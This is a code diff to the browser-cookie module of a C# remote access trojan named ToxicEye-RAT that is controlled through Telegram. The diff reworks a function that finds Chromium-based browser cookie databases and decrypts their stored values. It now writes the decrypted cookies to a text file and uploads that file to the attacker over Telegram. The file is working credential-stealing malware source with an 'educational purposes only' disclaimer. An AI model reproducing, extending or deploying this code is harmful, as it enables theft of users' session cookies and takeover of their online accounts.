@@ -1,13 +1,12 @@
 ﻿/* 
        ^ Author    : LimerBoy
        ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
+       ^ Github    : https://github.com/LimerBoy
 
        > This program is distributed for educational purposes only.
 */
 
 using System;
-using System.Collections.Generic;
 using System.IO;
 
 namespace TelegramRAT
@@ -15,8 +14,7 @@ namespace TelegramRAT
     internal class Cookies
     {
 
-        // Return list with arrays (value, hostKey, name, path, expires, isSecure)
-        public static List<Dictionary<string, string>> get()
+        public static void get()
         {
             // Path info
             string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
@@ -51,9 +49,10 @@ namespace TelegramRAT
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<Dictionary<string, string>> cookies = new List<Dictionary<string, string>>();
             // Database
             string tempCookieLocation = "";
+            string filename = "cookies.txt";
+            string output = "[COOKIES]\n\n";
 
             // Search all browsers
             foreach (string browser in chromiumBasedBrowsers)
@@ -92,23 +91,22 @@ namespace TelegramRAT
                     {
                         break;
                     }
+                    // Add
+                    output += "VALUE: " + Crypt.toUTF8(Crypt.decryptChrome(value, browser)) + "\n"
+                           + "HOST: " + hostKey + "\n"
+                           + "NAME: " + Crypt.toUTF8(name) + "\n"
+                           + "PATH: " + path + "\n"
+                           + "EXPIRE: " + expires + "\n"
+                           + "SECURE: " + isSecure + "\n"
+                           + "\n";
 
-                    Dictionary<string, string> credentials = new Dictionary<string, string>
-                    {
-                        ["value"] = Crypt.toUTF8(Crypt.decryptChrome(value, browser)),
-                        ["hostKey"] = hostKey,
-                        ["name"] = Crypt.toUTF8(name),
-                        ["path"] = path,
-                        ["expires"] = expires,
-                        ["isSecure"] = isSecure
-                    };
-                    cookies.Add(credentials);
                     continue;
                 }
                 continue;
             }
-
-            return cookies;
+            // Send
+            File.WriteAllText(filename, output);
+            telegram.UploadFile(filename, true);
         }
     }
 }
